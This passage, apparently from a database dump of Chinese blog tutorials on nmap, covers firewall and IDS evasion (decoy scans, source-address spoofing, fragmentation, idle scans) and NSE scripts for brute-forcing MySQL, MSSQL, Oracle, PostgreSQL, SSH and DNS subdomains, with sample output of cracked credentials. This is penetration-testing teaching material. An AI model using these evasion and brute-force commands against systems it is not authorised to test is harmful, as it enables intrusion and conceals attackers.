#00ccff;"><strong>&nbsp;规避的基本思路是：</strong></span></p><p><strong>1、通过伪造访问的IP地址</strong></p><p><strong>2、通过对发送信息进行处理</strong></p><p><strong>3、将风险进行嫁接</strong></p><p><strong>4、其他的技术</strong></p><p><span style="font-size: 16px;"><strong><span style="color: #00ccff;">伪造IP地址</span></strong></span></p><p>伪造IP地址有很多种方法，可以通过下面的这几种方法是我认为比较常见的希望大家能喜欢</p><p><strong>一、诱饵扫描(-D)</strong></p><p><strong>诱饵扫描的工作原理是：通过伪造大量的IP与自己真实的IP一起访问网站，从而混淆管理员的判断，其中问你们使用ME来代表自己的真实地址</strong></p><p>例子：虚构一个IP为203.88.163.34与自己的真实地址去扫描nmap.org</p><p>命令：nmap -F -D&nbsp;203.88.163.34,ME nmap.org</p><p>运行的结果如下：</p><p><img src="/upload/image/20190302/1551522775135777.png" alt=""/></p><p>但是在使用伪造的IP的同时，我们要注意要对伪造的IP进行主机发现，来判断主机是否存在，是否开启，因为有些防火墙策略是有这样规定的：<strong>如果访问的IP主机是关闭或者是为空的话，就讲所有的返回内容过滤掉</strong>。试想一下，如果主机关闭或者是不存在，那么怎么可能会发送扫描的命令给目标主机呢？</p><p>要找到开启的目标主机理论上是没有什么要求的，但是为了节约时间，我建议是直接使用某个网站的IP地址，这样有一下的几个好处</p><p><strong>1、IP地址容易获得，一般的网站是通过ping参数就可以直接获取该网站的IP地址，除了一些不让进行Ping操作的网站除外</strong></p><p><strong>2、容易保证IP的正常开启，因为谁家的网站会经常关闭服务器，服务器一般是总是开启的</strong></p><p><strong>二、源地址欺骗(-S)</strong></p><p>源地址欺骗的原理是：通过将自己的IP伪装成为其他的IP去扫描目标主机从而骗过目标主机的追踪</p><p>假设要伪装成为1.1.1.1：参数-S 1.1.1.1 使用1.1.1.1进行扫描，让防火墙误以为是来自1.1.1.1的扫描行为</p><p>在使用的时候要注意与-e进行使用，因为除了制定要伪装成为的对象IP外，还要指定返回的IP地址</p><p><span style="font-size: 15px;"><strong>三、时间优化（-T）</strong></span></p><p>通过时间优化也提高通过防火墙和IDS的通过率</p><p><span style="color: #00ccff; font-size: 16px;"><strong>&nbsp;发送信息处理</strong></span></p><p><span style="font-size: 15px;"><strong>&nbsp;指定使用分片(-f)</strong></span></p><p>分片的工作原理是：<strong>将可疑的探测包进行分片处理（例如将TCP包拆分成多个IP包发送过去），某些简单的防火墙为了加快处理速度可能不会进行重组检查，以此避开其检查。</strong></p><p><span style="color: #00ccff; font-size: 16px;"><strong>将风险责任进行嫁接</strong></span></p><p><strong>空闲扫描（-sI）：</strong></p><p>这里有一篇比较全面的文章<a href="http://www.2cto.com/Article/201505/396631.html" target="_blank">http://www.2cto.com/Article/201505/396631.html </a>再次就不多做介绍<strong><br/></strong></p><p><span style="color: #00ccff; font-size: 16px;"><strong>其他的相关技术：</strong></span></p><p>有MAC伪造技术等</p><p><span style="font-size: 16px;"><strong><span style="color: #00ccff;">防火墙/IDS躲避和哄骗</span></strong></span></p><pre class="prettyprint java">-f;&nbsp;--mtu&nbsp;value&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;指定使用分片、指定数据包的MTU.\r\n-D&nbsp;decoy1,decoy2,ME&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用诱饵隐蔽扫描\r\n-S&nbsp;IP-ADDRESS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;源地址欺骗\r\n-e&nbsp;interface&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用指定的接口\r\n-g/&nbsp;--source-port&nbsp;PROTNUM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用指定源端口&nbsp;&nbsp;\r\n--proxies&nbsp;url1,[url2],...&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用HTTP或者SOCKS4的代理&nbsp;\r\n\r\n--data-length&nbsp;NUM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;填充随机数据让数据包长度达到NUM\r\n--ip-options&nbsp;OPTIONS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用指定的IP选项来发送数据包\r\n--ttl&nbsp;VALUE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置IP&nbsp;time-to-live域\r\n--spoof-mac&nbsp;ADDR/PREFIX/VEBDOR&nbsp;&nbsp;MAC地址伪装\r\n--badsum&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用错误的checksum来发送数据包</pre><p><br/></p>', 'nmap', 1, 2, '2019-03-02', 60, -2, 0, '/upload/image/20190302/5a9e2df9f98478bd0ae555df71b37234.jpg'),
	(98, 'nmap进阶指南', '国光', '<p>nmap高级用法之脚本使用<br/>按照脚本分类进行扫描<br/><br/>nmap --script 类别<br/><br/>nmap官方脚本文档: https://nmap.org/nsedoc/<br/><br/><br/>左侧列出了脚本的分类点击分类 可以看到每一个分类下有很多具体的脚本供我们使用。nmap --script=类别这里的类别可以填写下面14大分类中的其中之一也可以填写分类里面的具体漏洞扫描脚本。nmap脚本分类:<br/><br/>- auth: 负责处理鉴权证书绕开鉴权的脚本 &nbsp;<br/>- broadcast: 在局域网内探查更多服务开启状况如dhcp/dns/sqlserver等服务 &nbsp;<br/>- brute: 提供暴力破解方式针对常见的应用如http/snmp等 &nbsp;<br/>- default: 使用-sC或-A选项扫描时候默认的脚本提供基本脚本扫描能力 &nbsp;<br/>- discovery: 对网络进行更多的信息如SMB枚举、SNMP查询等 &nbsp;<br/>- dos: 用于进行拒绝服务攻击 &nbsp;<br/>- exploit: 利用已知的漏洞入侵系统 &nbsp;<br/>- external: 利用第三方的数据库或资源例如进行whois解析 &nbsp;<br/>- fuzzer: 模糊测试的脚本发送异常的包到目标机探测出潜在漏洞 <br/>- intrusive: 入侵性的脚本此类脚本可能引发对方的IDS/IPS的记录或屏蔽<br/>- malware: 探测目标机是否感染了病毒、开启了后门等信息 &nbsp;<br/>- safe: 此类与intrusive相反属于安全性脚本 &nbsp;<br/>- version: 负责增强服务与版本扫描Version Detection功能的脚本 &nbsp;<br/>- vuln: 负责检查目标机是否有常见的漏洞Vulnerability如是否有MS08_067<br/><br/>使用具体脚本进行扫描<br/><br/>nmap --script 具体的脚本 www.baidu.com<br/><br/>常用脚本使用案例<br/>扫描服务器的常见漏洞<br/><br/>nmap --script vuln &lt;target&gt;<br/><br/>检查FTP是否开启匿名登陆<br/><br/>nmap --script ftp-anon &lt;target&gt;<br/>PORT&nbsp;&nbsp; STATE SERVICE<br/>21/tcp open&nbsp; ftp<br/>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br/>| -rw-r--r--&nbsp;&nbsp; 1 1170&nbsp;&nbsp;&nbsp;&nbsp; 924&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 31 Mar 28&nbsp; 2001 .banner<br/>| d--x--x--x&nbsp;&nbsp; 2 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jan 14&nbsp; 2002 bin<br/>| d--x--x--x&nbsp;&nbsp; 2 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Aug 10&nbsp; 1999 etc<br/>| drwxr-srwt&nbsp;&nbsp; 2 1170&nbsp;&nbsp;&nbsp;&nbsp; 924&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2048 Jul 19 18:48 incoming [NSE: writeable]<br/>| d--x--x--x&nbsp;&nbsp; 2 root&nbsp;&nbsp;&nbsp;&nbsp; root&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Jan 14&nbsp; 2002 lib<br/>| drwxr-sr-x&nbsp;&nbsp; 2 1170&nbsp;&nbsp;&nbsp;&nbsp; 924&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1024 Aug&nbsp; 5&nbsp; 2004 pub<br/>|_Only 6 shown. Use --script-args ftp-anon.maxlist=-1 to see all.<br/><br/>对MySQL进行暴破解<br/><br/>nmap --script=mysql-brute &lt;target&gt;<br/>3306/tcp open&nbsp; mysql<br/>| mysql-brute:<br/>|&nbsp;&nbsp; Accounts<br/>|&nbsp;&nbsp;&nbsp;&nbsp; root:root - Valid credentials<br/><br/>一款强大的安全扫描器nmap：不老的神器<br/><br/>可以看出已经暴力成功破解了MySQL,在368秒内进行45061次猜测平均TPS为146.5。<br/>对MsSQL进行暴破解<br/><br/>nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt &lt;host&gt;<br/>| ms-sql-brute:<br/>|&nbsp;&nbsp; [192.168.100.128\\TEST]<br/>|&nbsp;&nbsp;&nbsp;&nbsp; No credentials found<br/>|&nbsp;&nbsp;&nbsp;&nbsp; Warnings:<br/>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sa: AccountLockedOut<br/>|&nbsp;&nbsp; [192.168.100.128\\PROD]<br/>|&nbsp;&nbsp;&nbsp;&nbsp; Credentials found:<br/>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; webshop_reader:secret =&gt; Login Success<br/>|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; testuser:secret1234 =&gt; PasswordMustChange<br/>|_&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lordvader:secret1234 =&gt; Login Success<br/><br/>对Oracle数据库进行暴破解<br/><br/>nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL &lt;host&gt;<br/>PORT&nbsp;&nbsp;&nbsp;&nbsp; STATE&nbsp; SERVICE REASON<br/>1521/tcp open&nbsp; oracle&nbsp; syn-ack<br/>| oracle-brute:<br/>|&nbsp;&nbsp; Accounts<br/>|&nbsp;&nbsp;&nbsp;&nbsp; system:powell =&gt; Account locked<br/>|&nbsp;&nbsp;&nbsp;&nbsp; haxxor:haxxor =&gt; Valid credentials<br/>|&nbsp;&nbsp; Statistics<br/>|_&nbsp;&nbsp;&nbsp; Perfomed 157 guesses in 8 seconds, average tps: 19<br/><br/>对pgSQL的暴力破解<br/><br/>nmap -p 5432 --script pgsql-brute &lt;host&gt;<br/>5432/tcp open&nbsp; pgsql<br/>| pgsql-brute:<br/>|&nbsp;&nbsp; root:&lt;empty&gt; =&gt; Valid credentials<br/>|_&nbsp; test:test =&gt; Valid credentials<br/><br/>对SSH进行暴力破解<br/><br/>nmap -p 22 --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst --script-args ssh-brute.timeout=4s &lt;target&gt;<br/>22/ssh open&nbsp; ssh<br/>| ssh-brute:<br/>|&nbsp; Accounts<br/>|&nbsp;&nbsp;&nbsp; username:password<br/>|&nbsp; Statistics<br/>|_&nbsp;&nbsp; Performed 32 guesses in 25 seconds.<br/><br/>利用DNS进行子域名暴力破解<br/><br/>nmap --script dns-brute www.baidu.com<br/>λ nmap --script dns-brute www.baidu.com&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br/><br/>Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-25 13:12 ?<br/>Nmap scan report for www.baidu.com (180.97.33.108)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br/>Host is up (0.018s latency).&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br/>Other addresses for www.baidu.com (not scanned): 180.97.33.10<br/>Not shown: 998 filtered ports&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br/>PORT&nbsp;&nbsp;&nbsp; STATE SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br/>80/tcp&nbsp; open&nbsp; http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br/>443/tcp open&nbsp; https&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br/><br/>Host script results:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br/>| dns-brute:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br/>|&nbsp;&nbsp; DNS Brute-force hostnames:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br/>|&nbsp;&nbsp;&nbsp;&nbsp; admin.baidu.com - 10.26.109.19&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br/>|&nbsp;&nbsp;&nbsp;&nbsp; mx.baidu.com - 61.135.163.61&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br/>|&nbsp;&nbsp;&nbsp;&nbsp; svn.baidu.com - 10.65.211.174&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br/>|&nbsp;&nbsp;&nbsp;&nbsp; ads.baidu.com - 10.42.4.225&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br/><br/>Nmap done: 1 IP address (1 host up) scanned in 92.64 seconds<br/><br/>一款强大的安全扫描器nmap：不老的神器<br/><br/>额(⊙⊙) 这个admin.baidu.com后面那个10.26.109.19难道真的是百度内网的管理平台地址<br/>检查VMWare ESXESXi和服务器CVE-2009-3733中的路径遍历漏洞<br/><br/>nmap --script http-vmware-path-vuln -p80,443,8222,8333 &lt;host&gt;<br/>| http-vmware-path-vuln:<br/>|&nbsp;&nbsp; VMWare path traversal (CVE-2009-3733): VULNERABLE<br/>|&nbsp;&nbsp;&nbsp;&nbsp; /vmware/Windows 2003/Windows 2003.vmx<br/>|&nbsp;&nbsp;&nbsp;&nbsp; /vmware/Pentest/Pentest - Linux/Linux Pentest Bravo.vmx<br/>|&nbsp;&nbsp;&nbsp;&nbsp; /vmware/Pentest/Pentest - Windows/Windows 2003.vmx<br/>|&nbsp;&nbsp;&nbsp;&nbsp; /mnt/vmware/vmware/FreeBSD 7.2/FreeBSD 7.2.vmx<br/>|&nbsp;&nbsp;&nbsp;&nbsp; /mnt/vmware/vmware/FreeBSD 8.0/FreeBSD 8.0.vmx<br/>|&nbsp;&nbsp;&nbsp;&nbsp; /mnt/vmware/vmware/FreeBSD 8.0 64-bit/FreeBSD 8.0 64-bit.vmx<br/>|_&nbsp;&nbsp;&nbsp; /mnt/vmware/vmware/Slackware 13 32-bit/Slackware 13 32-bit.vmx<br/><br/>查询VMware服务器vCenterESXESXiSOAP API以提取版本信息。<br/><br/>λ nmap --script vmware-version -p443 10.0.1.4<br/><br/>Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-25 12:26 ?D1ú±ê×?ê±??<br/>Nmap scan report for 10.0.1.4<br/>Host is up (0.0019s latency).<br/><br/>PORT&nbsp;&nbsp;&nbsp; STATE SERVICE<br/>443/tcp open&nbsp; https<br/>| vmware-version:<br/>|&nbsp;&nbsp; Server version: VMware ESXi 6.5.0<br/>|&nbsp;&nbsp; Build: 4887370<br/>|&nbsp;&nbsp; Locale version: INTL 000<br/>|&nbsp;&nbsp; OS type: vmnix-x86<br/>|_&nbsp; Product Line ID: embeddedEsx<br/>Service Info: CPE: cpe:/o:vmware:ESXi:6.5.0<br/><br/>Nmap done: 1 IP address (1 host up) scanned in 6.28 seconds<br/><br/>一款强大的安全扫描器nmap：不老的神器<br/>参数详解<br/><br/>Nmap支持主机名,ip,网段的表示方式例如:blah.highon.coffee, namp.org/24, 192.168.0.1;10.0.0-25.1-254<br/><br/>-iL filename&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段<br/>-iR hostnum&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描<br/>--exclude host1[, host2]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 从扫描任务中需要排除的主机&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br/>--exculdefile exclude_file&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 排除文件中的IP,格式和-iL指定扫描文件的格式相同<br/><br/>主机发现<br/><br/>-sL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 仅仅是显示,扫描的IP数目,不会进行任何扫描<br/>-sn&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ping扫描,即主机发现<br/>-Pn&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 不检测主机存活<br/>-PS/PA/PU/PY[portlist]&nbsp; TCP SYN Ping/TCP ACK Ping/UDP Ping发现<br/>-PE/PP/PM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 使用ICMP echo, timestamp and netmask 请求包发现主机<br/>-PO[prococol list]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 使用IP协议包探测对方主机是否开启&nbsp; &nbsp;<br/>-n/-R&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 不对IP进行域名反向解析/为所有的IP都进行域名的反响解析<br/><br/>扫描技巧<br/><br/>-sS/sT/sA/sW/sM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描<br/>-sU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UDP扫描<br/>-sN/sF/sX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; TCP NullFINand Xmas扫描<br/>--scanflags&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 自定义TCP包中的flags<br/>-sI zombie host[:probeport]&nbsp;&nbsp;&nbsp;&nbsp; Idlescan<br/>-sY/sZ&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SCTP INIT/COOKIE-ECHO 扫描<br/>-sO&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 使用IP protocol 扫描确定目标机支持的协议类型<br/>-b “FTP relay host”&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 使用FTP bounce scan<br/><br/>指定端口和扫描顺序<br/><br/>-p&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 特定的端口 -p80,443 或者 -p1-65535<br/>-p U:PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 扫描udp的某个端口, -p U:53<br/>-F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 快速扫描模式,比默认的扫描端口还少<br/>-r&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 不随机扫描端口,默认是随机扫描的<br/>--top-ports &quot;number&quot;&nbsp;&nbsp;&nbsp; 扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个<br/>--port-ratio &quot;ratio&quot;&nbsp;&nbsp;&nbsp; 扫描指定频率以上的端口<br/><br/>服务版本识别<br/><br/>-sV&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测<br/>--version-intensity &quot;level&quot;&nbsp;&nbsp;&nbsp;&nbsp; 设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高服务越有可能被正确识别。默认是7<br/>--version-light&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 打开轻量级模式,为--version-intensity 2的别名<br/>--version-all&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 尝试所有探测,为--version-intensity 9的别名<br/>--version-trace&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 显示出详细的版本侦测过程信息<br/><br/>脚本扫描<br/><br/>-sC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 根据端口识别的服务,调用默认脚本<br/>--script=”Lua scripts”&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 调用的脚本名<br/>--script-args=n1=v1,[n2=v2]&nbsp;&nbsp;&nbsp;&nbsp; 